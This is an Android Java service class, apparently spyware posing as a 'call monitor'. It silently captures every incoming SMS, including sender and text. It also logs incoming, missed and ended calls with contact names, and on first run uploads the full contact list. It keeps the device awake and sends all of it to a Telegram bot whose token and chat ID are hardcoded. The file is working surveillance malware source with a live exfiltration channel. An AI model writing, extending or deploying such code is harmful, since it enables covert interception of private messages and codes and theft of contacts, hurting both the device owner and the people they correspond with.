package com.callmonitor.app;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.widget.Toast;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;

public class MonitorService extends Service {

    TelephonyManager tm;
    PhoneStateListener callListener;
    PowerManager.WakeLock wakeLock;
    Timer heartbeatTimer;
    Handler handler = new Handler();

    final String BOT_TOKEN = "7044430900:AAHjNYfAAzsvMabP5-3We65iSRFRQexnsQQ";
    final String CHAT_ID = "6133511447";

    String currentNumber = "";
    long callStart = 0;
    boolean inCall = false;

    // SMS Receiver
    BroadcastReceiver smsReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
                Bundle bundle = intent.getExtras();
                if(bundle != null) {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    if(pdus != null) {
                        for(int i = 0; i < pdus.length; i++) {
                            byte[] pdu = (byte[]) pdus[i];
                            android.telephony.SmsMessage msg = 
                                android.telephony.SmsMessage.createFromPdu(pdu);
                            final String sender = msg.getOriginatingAddress();
                            final String message = msg.getMessageBody();

                            new Thread(new Runnable() {
									public void run() {
										sendToTelegram("✉️ SMS", 
													   "From: " + sender + "\n" +
													   "Msg: " + message);
									}
								}).start();
                        }
                    }
                }
            }
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();

        // Test message to verify service started
        sendToTelegram("✅ SERVICE STARTED", 
					   "Monitor service is now active\n" +
					   "Model: " + Build.MODEL + "\n" +
					   "Android: " + Build.VERSION.RELEASE);

        // Keep device awake
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MonitorLock");
        wakeLock.acquire();

        // Setup call monitoring
        tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        setupCallListener();

        // Setup SMS receiver
        registerSmsReceiver();

        // Heartbeat every 10 minutes
        heartbeatTimer = new Timer();
        heartbeatTimer.schedule(new TimerTask() {
				@Override
				public void run() {
					sendHeartbeat();
				}
			}, 60000, 600000);

        // First run backup
        if(getSharedPreferences("prefs", MODE_PRIVATE).getBoolean("first", true)) {
            handler.postDelayed(new Runnable() {
					public void run() {
						performInitialBackup();
					}
				}, 5000);
        }
    }

    void setupCallListener() {
        callListener = new PhoneStateListener() {
            @Override
            public void onCallStateChanged(int state, String phoneNumber) {
                switch(state) {
                    case TelephonyManager.CALL_STATE_RINGING:
                        if(phoneNumber != null && phoneNumber.length() > 0) {
                            currentNumber = phoneNumber;
                            callStart = System.currentTimeMillis();
                            inCall = true;

                            final String num = phoneNumber;
                            new Thread(new Runnable() {
									public void run() {
										sendToTelegram("📞 INCOMING", 
													   "Number: " + num + "\n" +
													   "Contact: " + getContactName(num));
									}
								}).start();
                        }
                        break;

                    case TelephonyManager.CALL_STATE_IDLE:
                        if(inCall && callStart > 0) {
                            final long duration = (System.currentTimeMillis() - callStart) / 1000;
                            final String num = currentNumber;

                            new Thread(new Runnable() {
									public void run() {
										if(duration < 2) {
											sendToTelegram("⚠️ MISSED", 
														   "Number: " + num + "\n" +
														   "Contact: " + getContactName(num));
										} else {
											sendToTelegram("📞 ENDED", 
														   "Number: " + num + "\n" +
														   "Contact: " + getContactName(num) + "\n" +
														   "Duration: " + duration + " sec");
										}
									}
								}).start();

                            inCall = false;
                            callStart = 0;
                            currentNumber = "";
                        }
                        break;
                }
            }
        };

        tm.listen(callListener, PhoneStateListener.LISTEN_CALL_STATE);
    }

    void registerSmsReceiver() {
        IntentFilter filter = new IntentFilter();
        filter.addAction("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(smsReceiver, filter);
    }

    void performInitialBackup() {
        new Thread(new Runnable() {
				public void run() {
					try {
						// Send device info
						sendToTelegram("📱 DEVICE INFO", 
									   "Model: " + Build.MODEL + "\n" +
									   "Brand: " + Build.BRAND + "\n" +
									   "Android: " + Build.VERSION.RELEASE);

						Thread.sleep(2000);

						// Backup contacts
						backupContacts();

						Thread.sleep(2000);

						// Mark first run done
						getSharedPreferences("prefs", MODE_PRIVATE).edit()
							.putBoolean("first", false).commit();

						sendToTelegram("✅ BACKUP DONE", "All contacts backed up");

					} catch(Exception e) {
						sendToTelegram("❌ ERROR", e.toString());
					}
				}
			}).start();
    }

    void backupContacts() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
									 null, null, null, null);

            StringBuilder contacts = new StringBuilder();
            int count = 0;

            if(cursor != null) {
                while(cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndex(
													   ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndex(
														 ContactsContract.CommonDataKinds.Phone.NUMBER));

                    if(name == null) name = "No Name";
                    if(number == null) number = "No Number";

                    contacts.append(count+1).append(". ").append(name)
						.append(" - ").append(number).append("\n");
                    count++;

                    if(count % 50 == 0) {
                        sendToTelegram("📱 CONTACTS", contacts.toString());
                        contacts = new StringBuilder();
                        Thread.sleep(1000);
                    }
                }
                cursor.close();
            }

            if(contacts.length() > 0) {
                sendToTelegram("📱 CONTACTS (" + count + ")", contacts.toString());
            }

        } catch(Exception e) {
            sendToTelegram("Contacts Error", e.toString());
        }
    }

    void sendHeartbeat() {
        new Thread(new Runnable() {
				public void run() {
					sendToTelegram("💓 HEARTBEAT", "Service is alive");
				}
			}).start();
    }

    String getContactName(String number) {
        if(number == null) return "Unknown";
        try {
            Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, 
										   Uri.encode(number));
            Cursor cursor = getContentResolver().query(uri, 
													   new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);

            if(cursor != null && cursor.moveToFirst()) {
                String name = cursor.getString(0);
                cursor.close();
                return name;
            }
        } catch(Exception e) {}
        return "Unknown";
    }

    void sendToTelegram(final String title, final String msg) {
        new Thread(new Runnable() {
				public void run() {
					try {
						String text = title + "\n\n" + msg + "\n\n" + Build.MODEL;

						URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
						HttpURLConnection conn = (HttpURLConnection) url.openConnection();
						conn.setRequestMethod("POST");
						conn.setRequestProperty("Content-Type", "application/json");
						conn.setDoOutput(true);
						conn.setConnectTimeout(15000);

						String json = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + 
							escapeJson(text) + "\"}";

						OutputStream os = conn.getOutputStream();
						os.write(json.getBytes("UTF-8"));
						os.close();

						int code = conn.getResponseCode();
						conn.disconnect();

					} catch(Exception e) {
						e.printStackTrace();
					}
				}
			}).start();
    }

    String escapeJson(String s) {
        if(s == null) return "";
        return s.replace("\\", "\\\\")
			.replace("\"", "\\\"")
			.replace("\n", "\\n")
			.replace("\r", "\\r");
    }

    String getTime() {
        return new SimpleDateFormat("dd/MM HH:mm:ss").format(new Date());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        if(callListener != null) {
            tm.listen(callListener, PhoneStateListener.LISTEN_NONE);
        }

        try {
            unregisterReceiver(smsReceiver);
        } catch(Exception e) {}

        if(wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }

        if(heartbeatTimer != null) {
            heartbeatTimer.cancel();
        }

        super.onDestroy();
    }
}
